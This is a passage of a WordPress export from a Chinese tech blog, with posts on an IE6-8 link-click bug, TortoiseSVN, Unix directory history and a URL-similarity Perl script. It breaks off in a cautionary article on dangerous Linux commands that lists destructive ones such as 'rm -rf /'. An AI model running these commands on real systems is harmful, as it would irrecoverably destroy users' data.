		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>120</wp:post_id>
		<wp:post_date><![CDATA[2014-06-24 09:09:37]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-06-24 09:09:37]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[php%e4%b8%ad%e6%85%8e%e7%94%a8%e5%8f%8c%e7%ad%89%e4%ba%8e]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
		<category domain="post_tag" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>IE678下链接图片点不中问题讨论</title>
		<link>http://wp.veitor.net/2014/06/26/ie678%e4%b8%8b%e9%93%be%e6%8e%a5%e5%9b%be%e7%89%87%e7%82%b9%e4%b8%8d%e4%b8%ad%e9%97%ae%e9%a2%98%e8%ae%a8%e8%ae%ba/</link>
		<pubDate>Thu, 26 Jun 2014 07:01:17 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=124</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="http://storage.veitor.net/uploads/2014/06/QQ截图20140626150002.jpg"><img class="aligncenter size-full wp-image-125" alt="QQ截图20140626150002" src="http://storage.veitor.net/uploads/2014/06/QQ截图20140626150002.jpg" width="1012" height="296" /></a>因为今天制作的房产项目中出现了图片链接无法点击问题，重新审视了一下块集元素和内联元素，不是混淆，而是重新想了一下新的东西，有时候在我们进行重构的时候，偶尔会为了实际需要而将内联元素强制显示为块集元素，在一般情况下，这个是不会出问题的，而且可以很轻松的通过标准，但是在某一些情况下，虽然验证工具可以放过我们，但是在ie678下面会出现解析不正确的问题，下面就简单跟大家分享一下这个问题。
有时候由于需要文字和图片同时获取到点击态，或者需要实现一些高难度的效果，就需要多标签来写结构，可能的结构会如下所示：
&lt;div class="block"&gt;
&lt;a href="http://www.hualongxiang.com"&gt;&lt;span&gt;&lt;img src="http://static.hualongxiang.com/logo/logo.jpg" alt="hlx" /&gt;&lt;/span&gt;&lt;/a&gt;
&lt;/div&gt;
在没有被赋予强大的CSS的时候，是可以正常点击的，但是当赋予需要的CSS的时候，在ie8一下就会出现图片区域点击不到的情况：
.block span{float:left;}
如果将span标签块集化：
.block span{float:left;dispaly:block;width:100px;height:100px;}
最终的结果依然不是不能点击到，但是图片区域以为的内容确可以正常点击。
而对于此，我的理解是这样的：
因为a标签本身就是一个内联元素标签，内联标签内正常情况只允许放置内联元素，放置块集元素本身语法就有问题，虽然表面上放置的span标签，但是我们又将其强制块集化，在某些浏览器下还是会解析错误，比如说ie6/7，所以这里针对链接的这种情况，出现的问题就是图片区域无法点击。
针对这种问题的解决方法：
保证在a标签中不要放置块集元素，或者强制块集元素，如果需要解决一些特殊效果，可以采取将这个强制元素跟a内置的img标签同级放置，这样也可以避免图片点击不到问题。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>124</wp:post_id>
		<wp:post_date><![CDATA[2014-06-26 07:01:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-06-26 07:01:17]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ie678%e4%b8%8b%e9%93%be%e6%8e%a5%e5%9b%be%e7%89%87%e7%82%b9%e4%b8%8d%e4%b8%ad%e9%97%ae%e9%a2%98%e8%ae%a8%e8%ae%ba]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="js"><![CDATA[JS]]></category>
		<category domain="post_tag" nicename="%e5%89%8d%e7%ab%af"><![CDATA[前端]]></category>
						</item>
					<item>
		<title>SVN使用方法</title>
		<link>http://wp.veitor.net/2014/07/14/svn%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95/</link>
		<pubDate>Mon, 14 Jul 2014 07:05:58 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=128</guid>
		<description></description>
		<content:encoded><![CDATA[<div id="cnblogs_post_body">
<strong>问题一：Revert changes from this revision 跟Revert to this</strong>
譬如有个文件，有十个版本，假定版本号是1，2，3，4，5，6，7，8，9，10。
(1)Revert to this revision： 如果是在版本6这里点击“Revert to this revision”，表示7～10的修改全部作废，历史倒退到了版本6那个年代。
(2)Revert changes from this revision：如果是在版本6这里点击“Revert changes from this revision”，表示版本6这个历史事件被抹杀了，只剩下除版本6外的9个历史事件了。
如果俺是同时选择了6，7，8三个历史时期并点击“Revert changes from this revision”，表示抹杀6~8这仨历史时期。
同理，如果同时选择7～10，然后点击“Revert changes from this revision”，则效果跟在版本6这里点击“Revert to this revision”是一样的。
TortoiseSVN是windows下其中一个非常优秀的SVN客户端工具。通过使用它，我们可以可视化的管理我们的版本库。不过由于它只是一个客户端，所以它不能对版本库进行权限管理。
TortoiseSVN不是一个独立的窗口程序，而是集成在windows右键菜单中，使用起来比较方便。
01、SVN Checkout(SVN取出)
点击SVN Checkout，弹出检出提示框，在URL of repository输入框中输入服务器仓库地址，在Checkout directory输入框中输入本地工作拷贝的路径，点击确定，即可检出服务器上的配置库。
02、SVN Update(SVN更新)
如果配置库在本地已有工作拷贝，则取得最新版本只是执行SVN Update即可，点击SVN Update，系统弹出更新提示框，点击确定，则把服务器是最新版本更新下来
03、Import（导入）
选择要提交到服务器的目录，右键选择TortoiseSVN----Import，系统弹出导入提示框，在URL of repository输入框中输入服务器仓库地址，在Import Message输入框中输入导入日志信息，点击确定，则文件导入到服务器仓库中。
04、Add(加入)
如果有多个文件及文件夹要提交到服务器，我们可以先把这些要提交的文件加入到提交列表中，要执行提交操作，一次性把所有文件提交，如图，可以选择要提交的文件，然后点击执行提交（SVN Commit）,即可把所有文件一次性提交到服务器上
05、Resolving Conflicts(解决冲突)
有时你从档案库更新文件会有冲突。冲突产生于两人都修改文件的某一部分。解决冲突只能靠人而不是机器。当产生冲突时，你应该打开冲突的文件，查找以&lt;&lt;&lt;&lt;&lt;&lt;&lt;开始的行。冲突部分被标记：
&lt;&lt;&lt;&lt;&lt;&lt;&lt; filename
your changes
=======
code merged from repository
&gt;&gt;&gt;&gt;&gt;&gt;&gt; revision
Subversion为每个冲突文件产生三个附加文件：
filename.ext.mine
更新前的本地文件。
filename.ext.rOLDREV
你作改动的基础版本。
filename.ext.rNEWREV
更新时从档案库得到的最新版本。
使 用快捷菜单的编辑冲突Edit Conflict命令来解决冲突。然后从快捷菜单中执行已解决Resolved命令，将改动送交到档案库。请注意，解决命令并不解决冲突，而仅仅是删除 filename.ext.mineandfilename.ext.r*文件并允许你送交。
06、Check for Modifications（检查更新）
点击Check for Modifications,系统列表所以待更新的文件及文件夹的状态.
07、Revision Graph(版本分支图)
查看文件的分支,版本结构,可以点击Revision Graph,系统以图形化形式显示版本分支.
08、Rename(改名)
SVN支持文件改名,点击Rename,弹出文件名称输入框,输入新的文件名称,点击确定,再把修改提交,即可完成文件改名
09、Delete(删除)
SVN支持文件删除,而且操作简单,方便,选择要删除的文件,点击Delete,再把删除操作提交到服务器
10、Moving(移动)
选择待移动的文件和文件夹；按住右键拖动right-drag文件（夹）到跟踪拷贝内的新地方；松开左键；在弹出菜单中选择move files in Subversion to here
11、Revert(还原)
还原操作,如刚才对文件做了删除操作,现在把它还原回来,点击删除后,再点击提交,会出现如上的提示框,点击删除后,再点击Revert,即已撤销删除操作,如果这时候点击提交,则系统弹出提示框:没有文件被修改或增加,不能提交
12、Branch/Tag(分支/标记)
当需要创建分支，点击Branch/Tag，在弹出的提示框中，输入分支文件名，输入日志信息，点击确定，分支创建成功，然后可查看文件的版本分支情况
13、Switch(切换)
文件创建分支后，你可以选择在主干工作，还是在分支工作，这时候你可以通过Switch来切换。
14、Merge(合并)
主干和分支的版本进行合并，在源和目的各输入文件的路径，版本号，点击确定。系统即对文件进行合并，如果存在冲突，请参考冲突解决。
15、Export(导出)
把整个工作拷贝导出到本地目录下,导出的文件将不带svn文件标志,文件及文件夹没有绿色的”√”符号标志。
16、Relocate(重新定位)
当服务器上的文件库目录已经改变，我们可以把工作拷贝重新定位，在To URL输入框中输入新的地址
17、Add to Ignore List(添加到忽略列表)
大多数项目会有一些文件（夹）不需要版本控制，如编译产生的*.obj, *.lst,等。每次送交，TortoiseSVN提示那些文件不需要控制，挺烦的。这时候可以把这些文件加入忽略列表。
18、SVN其它相关功能
客户端修改用户密码:
打开浏览器,在地址栏内输入<a href="http://192.168.1.250/cgi-bin/ChangePasswd">http://192.168.1.250/cgi-bin/ChangePasswd</a>,启动客户端修改用户密码的界面,输入正确的用户名,旧密码,新密码(注意密码的位数应该不小于6,尽量使用安全的密码),点击修改即可.
19、SVN Commit（版本提交）
把自己工作拷贝所做的修改提交到版本库中，这样别人在获取最新版本(Update)的时候就可以看到你的修改了。
20、Show log（显示日志）
显示当前文件(夹)的所有修改历史。SVN支持文件以及文件夹独立的版本追溯。
21、Repo-Browser（查看当前版本库）
查看当前版本库，这是TortoiseSVN查看版本库的入口，通过这个菜单项，我们就可以进入配置库的资源管理器，然后就可以对配置库的文件夹进行各种管理，相当于我们打开我的电脑进行文件管理一样。
22、Revision Graph（版本图形）
查看当前项目或文件的修订历史图示。如果项目比较大型的话，一般会建多个分支，并且多个里程碑（稳定版本发布），通过这里，我们就可以看到项目的全貌。
23、Resolved（解决冲突）
如果当前工作拷贝和版本库上的有冲突，不能自动合并到一起，那么当你提交修改的时 候，tortoisesvn就会提示你存在冲突，这时候你就可以通过这个菜单项来解决冲突。冲突的解决有两种，一种是保留某一份拷贝，例如使用配置库覆盖 当前工作拷贝，或者反过来。还有一种是手动解决冲突，对于文本文件，可以使用tortoiseSVN自带的工具，它会列出存在冲突的地方，然后你就可以和 提交者讨论怎么解决这个冲突。同时它也对Word有很好的支持
24、Update to Revision(更新至版本)
从版本库中获取某一个历史版本。这个功能主要是方便查看历史版本用，而 不是回滚版本。注意：获取下来之后，对这个文件不建议进行任何操作。如果你做了修改，那么当你提交的时候SVN会提示你，当前版本已失效（即不是最新版 本），无法提交，需要先update一下。这样你所做的修改也就白费了。
25、Revert（回滚）
如果你对工作拷贝做了一些修改，但是你又不想要了，那么你可以使用这个选项把所做的修改撤销
26、Cleanup（清除状态）
如果当前工作拷贝有任何问题的话，可以使用这个选项进行修正。例如，有些文件原来是版本控制的， 但是你没有通过tortoiseSVN就直接删除了，但是tortoiseSVN还是保留着原来的信息（每个文件夹下都有一个.svn的隐藏文件夹，存放 着当前文件夹下所有文件夹的版本信息）所以这就会产生一些冲突。可以使用cleanup来清理一下。
27、GetLock/ReleaseLock（加锁/解锁）
如果你不想别人修改某个文件的话，那么你就可以把这个文件进行加锁，这样可以保证只有你对这个文件有修改权。除非你释放了锁，否则别人不可能提交任何修改到配置库中
28、Branch/tag（分支/标签）
Branch是分支的意思。例如当在设计一个东西的时候，不同的人有不同的实现，但是没有经过实践检验，谁也不想直接覆盖掉其他人的设计，所以可以引出不同的分支。将来如果需要，可以将这些分支进行合并。
tag是打标签的意思。通常当项目开发到一定程度，已经可以稳定运行的时候，可以对其打上一个标签，作为稳定版。将来可以方便的找到某个特定的版本（当然我们也可以使用版本号来查找，但是数字毕竟不方便）
SVN对于分支和标签都是采用类似Linux下硬链接的方式（同一个文件可以存在两个地方，删除一个不会影响另一个，所做修改会影响另一个），来管理文件的，而不是简单的复制一份文件的拷贝，所以不会有浪费存储空间的问题存在。
29、Export（导出）
这个功能是方便我们部署用。当我们需要发布一个稳定版本时，就可以使用这个功能将整个工程导出到某个文件夹，新的文件夹将不会包含任何版本信息了。
30、Relocate（版本库转移）
当我们版本库发生转移的时候就需要用到这个功能了。例如我原先的版本库是建在U盘上的，现在转移到（复制整个配置库文件夹）开发服务器上，使用https代替文件系统的访问。因此就需要将原来的工作拷贝的目标版本库重新定位到开发服务器上。
31、create patch（创建补丁）
创建补丁。如果管理员不想让任何人都随便提交修改，而是都要经过审核才能做出修改，那么其他人就可以通过创建补丁的方式，把修改信息（补丁文件）发送给管理员，管理员审核通过之后就可以使用apply patch提交这次修改了。
32、diff (比较修改部分)
如果你修改了一个文件，又不确定改了那些地方，这时你可以在相应文件上点右键，选择diff查看，与服务器上最新版的差异
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>128</wp:post_id>
		<wp:post_date><![CDATA[2014-07-14 07:05:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-07-14 07:05:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[svn%e4%bd%bf%e7%94%a8%e6%96%b9%e6%b3%95]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="svn"><![CDATA[SVN]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
						</item>
					<item>
		<title>Unix目录结构的来历</title>
		<link>http://wp.veitor.net/2014/07/15/unix%e7%9b%ae%e5%bd%95%e7%bb%93%e6%9e%84%e7%9a%84%e6%9d%a5%e5%8e%86/</link>
		<pubDate>Tue, 15 Jul 2014 00:53:10 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=130</guid>
		<description></description>
		<content:encoded><![CDATA[Unix（包含Linux）的初学者，常常会很困惑，不明白目录结构的含义何在。
<a href="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg"><img class="aligncenter size-full wp-image-131" alt="bg2012020601" src="http://storage.veitor.net/uploads/2014/07/bg2012020601.jpg" width="545" height="120" /></a>
举例来说，根目录下面有一个子目录/bin，用于存放二进制程序。但是，/usr子目录下面还有/usr/bin，以及/usr/local/bin，也用于存放二进制程序；某些系统甚至还有/opt/bin。它们有何区别？
长久以来，我也感到很费解，不明白为什么这样设计。像大多数人一样，我只是根据<a href="http://www.pathname.com/fhs/pub/fhs-2.3.html" target="_blank" rel="noopener noreferrer">《Unix文件系统结构标准》</a>（Filesystem Hierarchy Standard），死记硬背不同目录的区别。
昨天，我读到了Rob Landley的<a href="http://lists.busybox.net/pipermail/busybox/2010-December/074114.html" target="_blank" rel="noopener noreferrer">简短解释</a>，这才恍然大悟，原来Unix目录结构是历史造成的。
话说1969年，<a href="http://www.ruanyifeng.com/blog/2009/06/unix_turns_40.html" target="_blank" rel="noopener noreferrer">Ken Thompson</a>和<a href="http://www.ruanyifeng.com/blog/2011/10/dennis_ritchie.html" target="_blank" rel="noopener noreferrer">Dennis Ritchie</a>在小型机PDP-7上发明了Unix。1971年，他们将主机升级到了PDP-11。
<a href="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg"><img class="aligncenter size-full wp-image-132" alt="bg2012020602" src="http://storage.veitor.net/uploads/2014/07/bg2012020602.jpg" width="640" height="516" /></a>当时，他们使用一种叫做RK05的储存盘，一盘的容量大约是1.5MB。
<a href="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg"><img class="aligncenter size-full wp-image-133" alt="bg2012020603" src="http://storage.veitor.net/uploads/2014/07/bg2012020603.jpg" width="640" height="480" /></a>
没过多久，操作系统（根目录）变得越来越大，一块盘已经装不下了。于是，他们加上了第二盘RK05，并且规定第一块盘专门放系统程序，第二块盘专门 放用户自己的程序，因此挂载的目录点取名为/usr。也就是说，根目录"/"挂载在第一块盘，"/usr"目录挂载在第二块盘。除此之外，两块盘的目录结 构完全相同，第一块盘的目录（/bin, /sbin, /lib, /tmp...）都在/usr目录下重新出现一次。
后来，第二块盘也满了，他们只好又加了第三盘RK05，挂载的目录点取名为/home，并且规定/usr用于存放用户的程序，/home用于存放用户的数据。
从此，这种目录结构就延续了下来。随着硬盘容量越来越大，各个目录的含义进一步得到明确。
<strong>/</strong>：存放系统程序，也就是At&amp;t开发的Unix程序。
<strong>/usr</strong>：存放Unix系统商（比如IBM和HP）开发的程序。
<strong>/usr/local</strong>：存放用户自己安装的程序。
<strong>/opt</strong>：在某些系统，用于存放第三方厂商开发的程序，所以取名为option，意为"选装"。
（完）]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>130</wp:post_id>
		<wp:post_date><![CDATA[2014-07-15 00:53:10]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-07-15 00:53:10]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[unix%e7%9b%ae%e5%bd%95%e7%bb%93%e6%9e%84%e7%9a%84%e6%9d%a5%e5%8e%86]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="unix"><![CDATA[Unix]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
						</item>
					<item>
		<title>URL相似度计算的思考</title>
		<link>http://wp.veitor.net/2014/07/17/url%e7%9b%b8%e4%bc%bc%e5%ba%a6%e8%ae%a1%e7%ae%97%e7%9a%84%e6%80%9d%e8%80%83-2/</link>
		<pubDate>Thu, 17 Jul 2014 00:59:35 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=138</guid>
		<description></description>
		<content:encoded><![CDATA[在做一些web相关的工作的时候，我们往往可能需要做一些对url的处理，其中包括对相似的url的识别和处理。这就需要计算两个url的相似度。
那么怎么进行url相似度的计算的？我首先想到的是把一个url看作是一个字符串，这样就简化成两个字符串相似度的计算。字符串相似度计算有很多已经比较成熟的算法，比如“<a href="http://en.wikipedia.org/wiki/Levenshtein_Distance">编辑距离算法</a>”，该算法描述了两个字符串之间转换需要的最小的编辑次数；还有一些其他的比如“<a href="http://www.cnblogs.com/dartagnan/archive/2011/10/06/2199764.html">最长公共字串</a>”等方法。但这些方法对于url相似度的计算来说是不是够了呢？比如给以下三个url：
url1: www.spongeliu.com/xxx/123.html
url2: www.spongeliu.com/xxx/456.html
url3: www.spongeliu.com/xxx/abc.html
这三个url的编辑距离是一致的，但是直观上我们却认为url1和url2更加相似一些。
再比如我们要判断两个站点是否同一套建站模版建立的，抽出两个url如下这样：
url1: www.163.com/go/artical/43432.html
url2: www.sina.com.cn/go/artical/453109.html
这两个url按照情景应该是相似的，这就超出了字符串相似度判断的能力范围。
重新回到问题，要判断的是两个url的相似度，但是字符串的判断方法又不能很好应用。那么url和字符串的区别在哪里？这取决于如何定义相似的url。可以注意到，url比字符串含有更多的信息可以参考，因为url本身是包含<strong>结构和特征</strong>的，比如站点、目录。定义相似url的时候，是否要考虑站点？是否要考虑目录的一致？是否要考虑目录的深度？这取决于具体的需求。
考虑到url本身的结构，对其相似度的计算就可以抽象为对其关键特征相似度的计算。比如可以把站点抽象为一维特征，目录深度抽象为一维特征，一级目录、二级目录、尾部页面的名字也都可以抽象为一维特征。比如下面两个url:
url1:  http://www.spongeliu.com/go/happy/1234.html
url2:  http://www.spongeliu.com/snoopy/tree/abcd.html
先不定义他们是否相似，先来抽象一下他们的特征：
1、站点特征：如果两个url站点一样，则特征取值1，否则取值0；
2、目录深度特征：特征取值分别是两个url的目录深度是否一致；
3、一级目录特征：在这维特征的取值上，可以采用多种方法，比如如果一级目录名字相同则特征取1，否则取0；或者根据目录名字的编辑距离算出一个特征值； 或者根据目录名字的pattern，如是否数字、是否字母、是否字母数字穿插等。这取决于具体需求，这里示例仅仅根据目录名是否相同取1和0；
4、尾页面特征：这维特征的取值同一级目录，可以判断后缀是否相同、是否数字页、是否机器生成的随机字符串或者根据编辑长度来取值，具体也依赖于需求。这里示例仅仅判断最后一级目录的特征是否一致（比如是否都由数字组成、是否都有字母组成等）。
这样，对于这两个url就获得了4个维度的特征，分别是：1 1 0 0 。
有了这两个特征组合，就可以根据具体需求判断是否相似了。我们定义一下每个特征的重要程度，给出一个公式：
similarity = feather1 * x1 + feather2*x2 + feather3*x3 + feather4*x4;
其 中x表示对应特征的重要程度，比如我认为站点和目录都不重要，最后尾页面的特征才是最重要的，那么x1,x2,x3都可以取值为0，x4取值为 1，这样根据similarity就能得出是否相似了。或者认为站点的重要性占10%，目录深度占50%，尾页面的特征占40%，那么系数分别取值为 0.1\0.5\0\0.4即可。
其实这样找出需要的特征，可以把这个问题简化成一个机器学习的问题，只需要人为判断出一批url是否相似，用svm训练一下就可以达到机器判断的目的。
除了上面这种两个url相似度的判断，也可以将每一条url都抽象成一组特征，然后计算出一个url的得分，设置一个分数差的阈值，就可以达到从一大堆url中找出相似的url的目的。
&nbsp;
下面的代码是perl编写的抽象两个url特征的脚本，这只是一个测试的脚本，难免有bug和丑陋的地方，仅供参考：
<pre>#!/usr/bin/perl
use strict;
use warnings;
my $url1 = $ARGV[0];
my $url2 = $ARGV[1];
my @array1 = split( /\//, $url1 );
my @array2 = split( /\//, $url2 );
#特征1：目录数
my $path1 = @array1;
my $path2 = @array2;
#print $path1, $path2;
#特征2：是否目录结尾
my $lastispath1 = 0;
my $lastispath2 = 0;
if( $url1 =~ /\/$/ )
{
	$lastispath1 = 1;
}
if( $url1 =~ /\/$/ )
{
	$lastispath2 = 1;
}
#特征3：最后一级是否有后缀(htm,html,shtml等)
my $len;
my $hassuffix1 = 0;
my $hassuffix2 = 0;
my $suffixstr;
my $laststr1 = $array1[$path1 - 1];
my $laststr2 = $array2[$path2 - 1];
my $issuffixsame = 0;
if( $lastispath1 == 0 )
{
	my @suffix1 = split( /\./, $array1[$path1 - 1]);
	if( @suffix1 &amp;gt;= 2 )
	{
		$len = rindex( $suffix1[@suffix1 - 1]."\$", "\$");
		if( $len &amp;lt;= 5 )
		{
			$hassuffix1 = 1;
			$suffixstr = $suffix1[@suffix1 - 1];
			my $tmplen = rindex( $array1[@array1 - 1]."\$", "\$");
			$laststr1 = substr( $array1[@array1 - 1], 0, $tmplen-$len-1 );
		}
	}
}
if( $lastispath2 == 0 )
{
	my @suffix2 = split( /\./, $array2[$path2 - 1]);
	if( @suffix2 &amp;gt;= 2 )
	{
		$len = rindex( $suffix2[@suffix2 - 1]."\$", "\$");
		if( $len &amp;lt;= 5 )
		{
			$hassuffix2 = 1;
			if($suffixstr eq $suffix2[@suffix2 - 1])
			{
				$issuffixsame = 1;
			}
			my $tmplen = rindex( $array2[@array2 - 1]."\$", "\$");
			$laststr2 = substr( $array2[@array2 - 1], 0, $tmplen-$len-1 );
		}
	}
}
#特征3：最后一级几个分隔符(通过特征匹配计算laststr1和laststr2相似度，如果仅计算字符串相似度，可以用编辑长度)
my @area1 = split(/-/, $laststr1);
my @area2 = split(/-/, $laststr2);
my $i;
my $j;
my $totalarea1=0;
my $totalarea2=0;
my @patternarray1={0};
my @patternarray2={0};
my @splitarray1={0};
my @splitarray2={0};
#my $numarea1 = @area2;
#print $laststr1," ",$laststr2,"\n",$numarea1,"\n";
for ( $i = 1; $i&amp;lt;=@area1; $i++ )
{
	my @tmp1 = split( /_/, $area1[$i-1]);
	for( $j = 0; $j&amp;lt;@tmp1; $j++)
	{
		if( $tmp1[$j] =~ /^\d+$/ )
		{
			$patternarray1[$totalarea1] = 1; #数字pattern
		}
		elsif( $tmp1[$j] =~ /^[a-zA-Z]+$/)
		{
			$patternarray1[$totalarea1] = 2; #纯字母pattern
		}
		elsif( $tmp1[$j] =~ /^[a-zA-Z]+[0-9]+$/)
		{
			$patternarray1[$totalarea1] = 3; #先字母后数字pattern
		}
		elsif( $tmp1[$j] =~ /^[0-9]+[a-zA-Z]+$/)
		{
			$patternarray1[$totalarea1] = 4; #先数字后字母pattern
		}
		else
		{
			$patternarray1[$totalarea1] = 5; #其他pattern
		}
		if( $j == 0 )
		{
			$splitarray1[$totalarea1]=1;
		}
		else
		{
			$splitarray1[$totalarea1]=2;
		}
		$totalarea1 ++;
	}
}
for ( $i = 1; $i&amp;lt;=@area2; $i++ )
{
	my @tmp2 = split( /_/, $area2[$i-1]);
	for( $j = 0; $j&amp;lt;@tmp2; $j++)
	{
		if( $tmp2[$j] =~ /^\d+$/ )
		{
			$patternarray2[$totalarea2] = 1; #数字pattern
		}
		elsif( $tmp2[$j] =~ /^[a-zA-Z]+$/)
		{
			$patternarray2[$totalarea2] = 2; #纯字母pattern
		}
		elsif( $tmp2[$j] =~ /^[a-zA-Z]+[0-9]+$/)
		{
			$patternarray2[$totalarea2] = 3; #先字母后数字pattern
		}
		elsif( $tmp2[$j] =~ /^[0-9]+[a-zA-Z]+$/)
		{
			$patternarray2[$totalarea2] = 4; #先数字后字母pattern
		}
		else
		{
			$patternarray2[$totalarea2] = 5; #其他pattern
		}
		if( $j == 0 )
		{
			$splitarray2[$totalarea2]=1;
		}
		else
		{
			$splitarray2[$totalarea2]=2;
		}
		$totalarea2 ++;
	}
}
print $path1," ",$lastispath1," ",$hassuffix1," ",$issuffixsame," ",$totalarea1;
for( $i = 0; $i&amp;lt;$totalarea1; $i++)
{
	print " ",$splitarray1[$i]," ",$patternarray1[$i];
}
print "\n";
print $path2," ",$lastispath2," ",$hassuffix1," ",$issuffixsame," ",$totalarea2;
for( $i = 0; $i&amp;lt;$totalarea2; $i++)
{
	print " ",$splitarray2[$i]," ",$patternarray2[$i];
}
print "\n";
#print @array1;</pre>
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>138</wp:post_id>
		<wp:post_date><![CDATA[2014-07-17 00:59:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-07-17 00:59:35]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[url%e7%9b%b8%e4%bc%bc%e5%ba%a6%e8%ae%a1%e7%ae%97%e7%9a%84%e6%80%9d%e8%80%83-2]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="url"><![CDATA[URL]]></category>
		<category domain="category" nicename="chengxuyushenghuo"><![CDATA[程序与生活]]></category>
		<category domain="category" nicename="jingyanfengxiang"><![CDATA[经验分享]]></category>
						</item>
					<item>
		<title>永远不要在 Linux 执行的 10 个最危险的命令</title>
		<link>http://wp.veitor.net/2014/07/17/%e6%b0%b8%e8%bf%9c%e4%b8%8d%e8%a6%81%e5%9c%a8-linux-%e6%89%a7%e8%a1%8c%e7%9a%84-10-%e4%b8%aa%e6%9c%80%e5%8d%b1%e9%99%a9%e7%9a%84%e5%91%bd%e4%bb%a4/</link>
		<pubDate>Thu, 17 Jul 2014 02:49:25 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=140</guid>
		<description></description>
		<content:encoded><![CDATA[Linux命令行佷有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正 在做什么时候。这篇文章并不打算引来你对Linux或linux 命令行的愤怒。我们只是想让你意识到在你运行某些命令时应该三思而后行。（译注：当然，以下命令通常都是在root权限下才能将愚蠢发挥到无可救药；在普 通用户身份下，破坏的只是自己的一亩三分地。）
<a href="http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg"><img class="aligncenter size-full wp-image-141" alt="08063106_Sreu" src="http://storage.veitor.net/uploads/2014/07/08063106_Sreu.jpg" width="600" height="446" /></a>
<strong>1. rm -rf 命令</strong>
rm -rf命令是删除文件夹及其内容最快的方式之一。仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。下列是一些rm 命令的选项。
<ul>
	<li>rm　命令在Linux下通常用来删除文件。</li>
	<li>rm -r 命令递归的删除文件夹，甚至是空的文件夹。（译注：个人认为此处应该是说错了，从常识看，应该是“甚至是非空的文件夹”）</li>
	<li>rm -f 命令能不经过询问直接删除‘只读文件’。（译注：Linux下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f这个参数 只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的rm命令其实也是没有删除提示的，只是一般的发行版都会将rm通过别名的方式增加-i参数来 要求删除确认，而-f则抑制了这个提示。）</li>
	<li>rm -rf / : 强制删除根目录下所有东东。（就是说删除完毕后，什么也没有了。。。）</li>
	<li>rm -rf *:　强制删除当前目录的所有文件。</li>
